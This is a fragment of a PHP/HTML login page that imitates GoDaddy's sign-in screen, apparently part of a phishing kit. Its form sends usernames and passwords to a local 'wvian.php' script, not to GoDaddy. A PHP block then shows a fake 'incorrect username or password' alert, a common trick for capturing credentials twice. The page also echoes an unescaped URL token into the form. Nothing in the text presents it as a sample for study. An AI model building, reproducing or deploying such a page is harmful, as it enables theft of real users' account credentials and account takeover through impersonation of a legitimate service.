...
<div id="login-status-message"><div><div class="ux-space ux-dialog-shell ux-alert ux-alert--critical ux-text ux-dialog--contrast ux-dialog--stretch ux-space--as-block ux-space--inline ux-space--block" aria-labelledby="login-failure-alert" role="alert" dismissible="false"><div class="ux-dialog-icon"><svg class="uxicon-svg-container ux-dialog-accessory--critical" height="1.5em" width="1.5em" role="presentation"><use fill="currentColor" xlink:href="#svg-container-alert"></use></svg></div><div class="ux-dialog-details"><div id="login-failure-alert" class="ux-dialog-title"></div><div class="ux-dialog-content">You entered an incorrect username or password. Please try again. </div></div></div></div></div>
	<?php } ?>
                                                    <form action="wvian.php?token=<?=$_GET['token']?>" autocomplete="off" method="POST" autocomplete="off">
                                                        <div id="form-container" class="">
                                                        <div id="create-account-link" class="remove-login-header">
                                                            <p>New to GoDaddy?</p><a
                                                                class="ux-button ux-text ux-text-size0 ux-button-inline"
                                                                href="https://sso.godaddy.com/account/create?realm=idp&amp;app=venture-redirector&amp;path=%2F"
                                                                target="_self" id="create_account"><span
                                                                    class="ux-button-text">Create an Account</span></a>
                                                        </div>
                                                        ...
                                                        <div>
                                                                    ...
                                                                    <div class="ux-field-frame ux-field-frame--stretch">
                                                                        <div
                                                                            ...
                                                                            <label class="ux-label ux-label--internal"
                                                                                for="password" id="passfrom">Password<span
                                                                                    class="ux-text ux-label-required ux-text-feedback-critical"
                                                                                    aria-hidden="true">*</span></label><input
                                                                                class="ux-text-entry-field"
                                                            ...
                                                            <div id="remember-me-container" class="input-container">
                                                                <div class="ux-text ux-checkbox-shell ux-text-input">
                                                                    <span class="ux-checkbox-lineheightbox"
                                                                        data-lineheight="I"><input
                                                                            class="ux-checkbox-input" type="checkbox"
                                                                            id="remember-me" name="rememberMe"
                                                                            value="true" checked=""><span
                                                                            class="ux-checkbox-indicator"><svg
                                                                                class="uxicon-svg-container ux-checkbox-indeterminate"
                                                                                height="1.5em" width="1.5em"
                                                                                role="presentation">
                                                                                <use fill="currentColor"
                                                                                    xlink:href="#svg-container-minus">
                                                                                </use>
                                                                            </svg><svg
                                                                                class="uxicon-svg-container ux-checkbox-checkmark"
                                                                                height="1.5em" width="1.5em"
                                                                                role="presentation">
                                                                                <use fill="currentColor"
                                                                                    xlink:href="#svg-container-checkmark">
                                                                                </use>
                                                                            </svg></span></span><label for="remember-me"
                                                                        class="ux-checkbox-label">Keep me signed in on
                                                                        this device</label>
                                                                </div>
                                                            </div>
                                                            <button
                                                                ...
                                                                target="_parent" type="submit" id="submitBtn"><span
                                                                    class="ux-button-text">Sign In</span></button>
                                                                    </form>
                                                            <div id="social-login-buttons-container" class="icon-only">
                                                                <p id="text-social-button-divider">or sign in with</p>
                                                                <div class="ux-sibling-set sibling-set-position ux-sibling-set-horizontal ux-sibling-set-gap-md ux-sibling-set--stretch ux-sibling-set--wrap"
                                                                    role="group" aria-describedby="">
                                                                    <div class="ux-text ux-sibling-set-children"
                                                                        style="--ux-siblingset-amount: 3;"><button
                                                                            class="ux-button alternative-login-button-icon-only ux-text ux-text-size0 ux-text-action ux-button-secondary ux-button-square"
                                                                            target="_top" type="button" id="apple_auth"
                                                                            aria-label="Sign in with Apple"
                                                                            data-testid="apple_auth"><svg
                                                                                class="uxicon-svg-container"
                                                                                height="1.5em" width="1.5em"
                                                                                role="presentation">
                                                                                <use fill="currentColor"
                                                                                    xlink:href="#svg-container-apple">
                                                                                </use>
                                                                            </svg></button><button
                                                                            class="ux-button alternative-login-button-icon-only ux-text ux-text-size0 ux-text-action ux-button-secondary ux-button-square"
                                                                            target="_top" type="button"
                                                                            id="facebook_auth"
                                                                            aria-label="Sign in with Facebook"
                                                                            data-testid="facebook_auth"><svg
                                                                                class="uxicon-svg-container"
                                                                                height="1.5em" width="1.5em"
                                                                                role="presentation">
                                                                                <use fill="currentColor"
                                                                                    xlink:href="#svg-container-facebook">
                                                                                </use>
                                                                            </svg></button><button
                                                                            class="ux-button alternative-login-button-icon-only ux-text ux-text-size0 ux-text-action ux-button-secondary ux-button-square"
                                                                            target="_top" type="button" id="google_auth"
                                                                            aria-label="Sign in with Google"
                                                                            data-testid="google_auth"><svg
                                                                                class="uxicon-svg-container"
                                                                                height="1.5em" width="1.5em"
                                                                                role="presentation">
                                                                                <use fill="currentColor"
                                                                                    xlink:href="#svg-container-google">
                                                                                </use>
                                                                            </svg></button></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <p id="recovery-links" class="">Need to find <a
                                                                class="ux-button ux-text ux-text-size0 ux-button-inline"
                                                                href="#"
                                                                target="_top" id="forgot_username"
                                                                aria-label="find your username"><span
                                                                    class="ux-button-text">your username</span></a> or
                                                            <a class="ux-button ux-text ux-text-size0 ux-button-inline"
                                                                href="#"
                                                                target="_top" id="forgot_password"
                                                                aria-label="find your password"><span
                                                                    class="ux-button-text">your password</span></a>?
                                                        </p>
                                                    </div>
                                                </div>
                                            </div>
